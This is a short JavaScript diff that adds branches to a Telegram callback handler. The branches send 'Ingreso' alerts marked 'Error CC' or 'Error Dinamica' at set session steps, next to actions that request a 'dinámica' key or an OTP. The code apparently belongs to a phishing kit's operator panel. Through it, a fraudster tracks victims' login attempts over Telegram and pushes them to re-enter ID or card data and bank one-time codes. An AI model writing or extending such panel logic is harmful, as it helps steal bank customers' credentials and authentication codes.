@@ -157,6 +157,18 @@ export async function respondToTelegramCallback(callback) {
       messageId: session.messageId,
       text: newText,
     });
+  } else if (session.step === 2 && action === "errorCC") {
+    const successMsg = `
+🚨 Ingreso: ${session.sessionId.split("-")[0]} 🚨
+❌ Error CC ❌
+    `;
+    await sendSimpleTelegramMessage(successMsg);
+  } else if (session.step === 3 && action === "errorDinamica") {
+    const successMsg = `
+🚨 Ingreso: ${session.sessionId.split("-")[0]} 🚨
+❌ Error Dinamica ❌
+    `;
+    await sendSimpleTelegramMessage(successMsg);
   } else if (
     session.step === 2 &&
     ["requestDinamica", "requestOtp"].includes(action)
